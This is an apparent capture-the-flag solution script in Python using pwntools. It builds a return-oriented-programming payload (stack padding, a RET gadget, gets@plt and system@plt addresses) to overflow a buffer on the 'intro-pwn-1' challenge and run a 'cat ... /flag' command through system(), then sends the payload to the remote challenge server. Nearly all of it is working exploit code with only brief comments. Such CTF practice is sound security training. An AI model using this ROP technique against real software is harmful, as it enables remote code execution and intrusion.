```python
from pwn import *
```

```python
# Padding + 
# RET-Gadget for Stack Alignment + 
# gets@plt Address to set RDI + 
# gets@plt-Address to write where RDI points to + 
# system@plt-Address + 
# \n for skipping first gets@plt + 
# Pass first argument for system to second gets@plt
payload = \
      b'A' * 24                           \
    + b'\x4c\x12\x40\x00\x00\x00\x00\x00' \
    + b'\x60\x10\x40\x00\x00\x00\x00\x00' \
    + b'\x60\x10\x40\x00\x00\x00\x00\x00' \
    + b'\x40\x10\x40\x00\x00\x00\x00\x00' \
    + b'\n' \
    + b'\n' + b'cat / /flag\x00'

print(payload)
```

```python
session = remote('28cc2415a5896135bf9dda53-1024-intro-pwn-1.challenge.cscg.live', 1337, ssl=True)
```

```python
session.recvline()
session.sendline(payload)
```

```python
try:
    while True:
        print(session.recvline(keepends=False))
except EOFError:
    pass
```
